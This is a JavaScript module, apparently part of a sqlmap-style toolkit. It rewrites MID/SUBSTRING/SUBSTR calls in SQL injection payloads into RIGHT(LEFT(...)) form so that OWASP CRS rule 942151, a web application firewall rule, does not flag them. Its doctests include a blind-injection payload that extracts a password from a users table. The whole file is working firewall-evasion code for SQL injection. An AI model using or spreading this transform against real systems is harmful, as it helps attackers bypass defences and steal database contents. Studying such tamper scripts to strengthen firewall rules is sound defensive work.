// 对标 sqlmap mid2leftright.py（MySQL/MariaDB 专用）：
// MID(A,B,C)/SUBSTRING(A,B,C)/SUBSTR(A,B,C) → RIGHT(LEFT(A,B+C-1),C)
// OWASP CRS 942151 黑名单含 MID/SUBSTR/SUBSTRING 而不含 LEFT/RIGHT
// （ PostgreSQL 的 FROM/FOR 拼写见 substring2leftright）
export const mid2leftright = {
  name: 'mid2leftright',
  description: 'MID/SUBSTRING/SUBSTR(A,B,C) → RIGHT(LEFT(A,B+C-1),C)（消除 CRS 942151 函数名记分）',
  doctests: [
    { input: 'MID(pw, 1, 1)', output: 'RIGHT(LEFT(pw, 1), 1)' },
    { input: 'SUBSTRING(pw, 2, 3)', output: 'RIGHT(LEFT(pw, 4), 3)' },
    { input: '1 AND SUBSTR((SELECT pw FROM users LIMIT 1),1,1)=0x73', output: '1 AND RIGHT(LEFT((SELECT pw FROM users LIMIT 1),1),1)=0x73' },
    { input: '1 AND 1=1', output: '1 AND 1=1' },
  ],
  transform(payload) {
    const re = /\b(?:MID|SUBSTRING|SUBSTR)\(\s*((?:[^()]|\([^()]*\))+?)\s*,(\s*)([^,()]+),(\s*)([^,()]+)\)/gi;
    return String(payload ?? '').replace(re, (m, expr, sp1, pos, sp2, len) => {
      const p = pos.trim();
      const l = len.trim();
      const end = /^\d+$/.test(p) && /^\d+$/.test(l) ? String(Number(p) + Number(l) - 1) : `${p}+${l}-1`;
      return `RIGHT(LEFT(${expr},${sp1}${end}),${sp2}${len})`;
    });
  },
};
export default mid2leftright;
